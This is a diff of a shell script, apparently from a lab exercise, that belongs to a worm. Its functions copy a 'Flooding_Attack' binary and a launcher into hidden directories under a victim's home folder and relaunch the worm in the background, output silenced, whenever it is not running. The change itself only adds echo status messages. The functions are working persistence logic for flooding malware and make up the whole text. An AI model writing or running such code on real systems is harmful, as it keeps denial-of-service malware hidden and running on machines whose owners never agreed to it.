@@ -18,6 +18,7 @@ wdir2="/home/victim/.firefox/.module"
 wfname="Flooding_Attack"
 
 require_worm_distributed() {
+    echo "Checking flood attack file ..."
     if [ ! -f "$wdir1/$wfname" -a -f "$wdir2/$wfname" ]; then
         mkdir -p $wdir1
         cp "$wdir2/$wfname" "$wdir1/$wfname"
@@ -29,6 +30,7 @@ require_worm_distributed() {
 }
 
 require_launcher_distributed(){
+    echo "Checking worm launcher file ..."
     if [ ! -f "$ldir1/$lfname" -a -f "$ldir2/$lfname" ]; then
         mkdir -p "$ldir1"
         cp -f "$ldir2/$lfname" "$ldir1/$lfname"
@@ -40,9 +42,10 @@ require_launcher_distributed(){
 }
 
 require_worm_running(){
+    echo "Checking worm running ..."
     ps -e | grep -q "$wfname"
     if [ $? -ne 0 ]; then
-	    # The final & makes this command run in background
+	# The final & makes this command run in background
         chmod +x $wdir1/$wfname && $wdir1/$wfname &> /dev/null &
     fi
 }
